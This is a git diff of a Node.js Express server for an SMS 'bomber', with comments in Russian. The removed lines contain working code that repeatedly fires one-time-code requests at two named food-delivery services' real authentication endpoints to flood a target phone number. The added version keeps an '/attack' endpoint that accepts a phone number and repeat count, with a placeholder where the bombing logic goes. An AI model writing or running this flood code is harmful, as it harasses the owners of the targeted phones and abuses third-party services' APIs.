@@ -1,45 +1,22 @@
 const express = require('express');
-const axios = require('axios');
-const cors = require('cors');
+const cors = require('cors'); // Обязательно для связи с GUI
 const app = express();
 
+// Разрешаем твоему GUI (с github.io) стучаться на этот сервер
 app.use(cors());
 app.use(express.json());
 
-const services = [
-    {
-        name: "Allo Pizza",
-        url: "https://allopizza.su/api/v1/auth/otp",
-        method: "POST",
-        data: (phone) => ({ phone: phone })
-    },
-    {
-        name: "M-Food",
-        url: "https://spb.m-food.ru/local/components/mfood/auth/ajax.php",
-        method: "POST",
-        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-        data: (phone) => `action=send_code&phone=%2B${phone}`
-    }
-];
+const PORT = process.env.PORT || 80; // Amvera любит порт 80
 
-app.post('/attack', async (req, res) => {
+app.post('/attack', (req, res) => {
     const { phone, repeats } = req.body;
-
-    for (let i = 0; i < repeats; i++) {
-        services.forEach(async (s) => {
-            try {
-                await axios({
-                    method: s.method,
-                    url: s.url,
-                    data: typeof s.data === 'function' ? s.data(phone) : s.data,
-                    headers: s.headers || {}
-                });
-            } catch (e) {}
-        });
-        await new Promise(r => setTimeout(r, 2000));
-    }
-    res.json({ success: true });
+    console.log(`Принята атака на: ${phone}, повторов: ${repeats}`);
+    
+    // ТУТ ДОЛЖНА БЫТЬ ТВОЯ ЛОГИКА БОМБЕРА
+    
+    res.status(200).json({ status: "success", message: "Attack started" });
 });
 
-const PORT = process.env.PORT || 3000;
-app.listen(PORT);
+app.listen(PORT, () => {
+    console.log(`Сервер запущен на порту ${PORT}`);
+});
